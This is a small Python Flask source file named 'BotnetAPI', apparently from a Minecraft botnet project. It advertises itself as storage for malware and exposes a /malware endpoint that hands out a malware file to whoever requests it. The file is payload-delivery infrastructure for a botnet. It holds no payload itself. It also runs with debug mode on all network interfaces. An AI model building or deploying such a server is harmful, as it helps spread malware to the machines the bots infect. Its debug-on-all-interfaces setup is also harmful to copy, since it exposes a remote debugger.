from flask import request, jsonify, Flask, send_from_directory
from pymongo import MongoClient
from bson.objectid import ObjectId
import json
import os

app = Flask(__name__)

# app.config.from_file('./secrets/config.json', load=json.load)
# DOWNLOAD_PATH = "C:/Users/Alexa/Documents/GitHub/MALW-MinecraftBotnet/API/downloads"
DOWNLOAD_PATH = "/home/flask_app/BotnetAPI/downloads"


#### API Endpoints ####

@app.route('/', methods=['GET'])
def home():
    return '''<h1>BotnetAPI - Secured database to store all your malware</h1>
                <p>A flask api implementation for malware.   </p>'''

@app.route('/malware', methods=['GET'])
def getMalware():
    return send_from_directory(DOWNLOAD_PATH, 'malware.txt')



if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True, ssl_context=('./certificates/cert.pem', './certificates/key.pem'))